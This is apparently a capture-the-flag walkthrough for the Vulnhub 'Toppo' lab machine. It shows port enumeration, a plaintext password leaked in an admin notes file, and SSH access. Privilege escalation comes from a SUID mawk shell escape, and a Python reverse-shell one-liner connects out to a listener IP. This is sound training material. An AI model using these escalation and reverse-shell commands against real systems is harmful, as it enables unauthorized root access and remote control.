Vulnhub - Toppo

# Vulnhub - Toppo
- Started the default enumeration. Found the TCP ports below:

  ```
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  111/tcp   open  rpcbind
  52932/tcp open  unknown
  ```

- Also ran nmap UDP scan, which returned the ports

  ```
  PORT    STATE         SERVICE VERSION
  68/udp  open|filtered dhcpc
  111/udp open          rpcbind 2-4 (RPC #100000)
  MAC Address: 00:0C:29:AD:EF:56 (VMware)
  ```

  - Using nikto, some folders where enumerated, but the one that called attention was /admin

  - Inside /admin there was a file called notes.txt containing the text below

    ```
    - - Note to myself :
    
    I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
    ```

- Assuming that ted is the username, once wasn't able to find it through any other enumeration, tried to SSH to box, once that 22/tcp is open.

- As ssh connection worked, started enumerating using LinEnum.sh, where these were the interesting findings

  - User ted is allowed to run /usr/bin/awk as root

    ```
    ted ALL=(ALL) NOPASSWD: /usr/bin/awk
    ```

  -  Root is allowed to ssh 
  - Noticed that system listen to other ports internally, not allowed externally
    - TCP 36808
    - UDP 34995
    - UDP 59288
    - UDP 68
    - UDP 611
    - UDP 57751
    - UDP 12712
  - SUID file /usr/bin/mawk found
  - SUID /usr/bin/python2.7 world writable
  - Besides user has permissions to sudo as root awk, sudo file doesn't exist, so this options is discharged

  - Checking the SUID file mawk, checked on gtfobins (https://gtfobins.github.io/gtfobins/mawk/) that there was a way to privesc directly
    - Executed /usr/bin/mawk 'BEGIN {system("/bin/sh")}' which worked.
  - Getting the content of /root/flag.txt file


```bash
# cat flag.txt
	_________                                  
	|  _   _  |                                 
	|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
	    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
	   _| |_ | \__. | | \__/ | | \__/ || \__. | 
	  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
	                 [__|     [__|            

Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

- Exploring other privesc possibilities

- Noticed that the same would work for awk, even without sudo

- As /usr/bin/python2.7 has SUID set as root, it is also possible to get a reverse shell elevated this was.

  ```
  /usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

  